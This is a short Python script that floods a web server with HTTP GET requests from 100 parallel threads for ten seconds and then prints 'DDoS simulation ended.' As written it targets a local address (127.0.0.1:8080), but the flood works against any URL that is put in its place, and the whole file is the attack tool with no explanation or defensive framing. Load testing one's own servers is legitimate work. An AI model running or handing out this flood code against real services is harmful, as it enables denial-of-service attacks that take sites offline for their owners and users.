import threading
import requests
import time

url = "http://127.0.0.1:8080"
threads = 100
duration = 10

def flood():
    while True:
        try:
            requests.get(url)
        except:
            pass

start = time.time()
for _ in range(threads):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()

time.sleep(duration)
print("DDoS simulation ended.")
